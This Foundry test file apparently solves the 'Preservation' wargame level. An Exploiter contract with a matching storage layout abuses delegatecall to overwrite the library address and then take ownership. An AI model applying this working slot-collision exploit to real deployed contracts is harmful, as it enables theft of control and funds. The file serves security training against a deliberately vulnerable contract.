// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Preservation, LibraryContract} from "../src/Preservation.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";

contract PreservationTest is Test {
    Utilities internal utils;
    Preservation internal preservation;
    LibraryContract internal libraryContract1;
    LibraryContract internal libraryContract2;

    address payable internal attacker;
    address payable internal owner;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(3);

        attacker = users[1];
        vm.label(attacker, "Attacker");

        vm.startPrank(owner);

        libraryContract1 = new LibraryContract();
        libraryContract2 = new LibraryContract();

        preservation = new Preservation(
            address(libraryContract1),
            address(libraryContract2)
        );

        assertEq(preservation.owner(), owner);

        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter();
        uint256 i = uint256(uint160(address(exploiter)));
        preservation.setFirstTime(i);

        preservation.setFirstTime(1);

        assertEq(preservation.owner(), attacker);
        vm.stopPrank();
    }
}

contract Exploiter {
    address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint storedTime; // slot3
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); // slot 4

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}
